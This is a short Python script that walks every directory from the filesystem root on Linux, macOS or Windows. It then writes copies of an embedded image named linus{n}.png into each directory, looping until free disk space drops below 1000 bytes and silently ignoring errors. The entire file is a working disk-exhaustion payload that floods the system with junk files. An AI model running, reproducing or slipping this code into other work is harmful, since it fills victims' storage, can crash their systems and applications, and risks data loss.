from pathlib import Path
import platform
import shutil

from Linus_images import img_1

if platform.system() in ("Linux", "Darwin"):
    p = Path("/")
else:
    p = Path("C:\\")

lista = []
for i in p.glob('**/*'):
    if i.is_dir():
        lista.append(i)

iter_count = 0
while shutil.disk_usage(p)[-1] > 1000:
    iter_count += 1
    for folder in lista:
        try:
            created_file = (folder / f"linus{iter_count}.png")
            created_file.touch()
            #print(f"Created {created_file}")
        except Exception:
            continue
        else:
            try:
                created_file.write_bytes(img_1)
            except Exception:
                continue
